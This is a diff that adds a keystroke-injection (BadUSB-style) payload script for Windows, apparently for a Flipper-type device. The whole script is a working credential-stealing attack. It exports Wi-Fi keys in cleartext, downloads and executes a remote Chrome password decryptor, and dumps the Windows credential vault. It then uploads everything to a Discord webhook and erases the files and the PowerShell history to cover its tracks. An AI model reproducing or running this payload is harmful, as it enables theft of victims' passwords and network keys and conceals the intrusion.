@@ -1,0 +1,52 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 2500
+STRING $webhook='%DISCORD_WEBHOOK%'
+ENTER
+DELAY 500
+REM WIFI EXFIL
+STRING cmd /c "netsh wlan export profile key=clear"
+ENTER
+DELAY 500
+STRING Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-fi.txt
+ENTER
+
+DELAY 500
+STRING $content='Flipper Flap Feport'; $payload=[PSCustomObject]@{ content=$content }
+ENTER
+DELAY 500
+STRING Invoke-RestMethod -ContentType "Application/Json" -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json)
+ENTER
+DELAY 500
+STRING curl.exe -F "file1=@Wi-fi.txt" $webhook
+
+ENTER
+DELAY 500
+STRING rm Wi-*
+ENTER
+DELAY 500
+REM END OF WIFI EXFIL
+REM CHROME EXFIL
+STRING $c = iwr https://raw.githubusercontent.com/thisismyrobot/chrome-decrypt.ps1/master/chrome-decrypt.minified.ps1; invoke-expression $c.Content | Out-File -FilePath chrome.txt
+ENTER
+REM END OF CHROME EXFIL
+DELAY 1000
+REM PASSVAULT EXFIL
+STRING [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ } | Out-File -FilePath Vault.txt
+ENTER
+REM END OF PASSVAULT EXFIL
+DELAY 500
+STRING curl.exe -F "file1=@chrome.txt" $webhook; rm chrome.txt
+ENTER
+DELAY 500
+STRING curl.exe -F "file1=@Vault.txt" $webhook; rm Vault.txt
+REM Delete pwsh history
+DELAY 500
+STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
+ENTER
+STRING exit
+ENTER
+
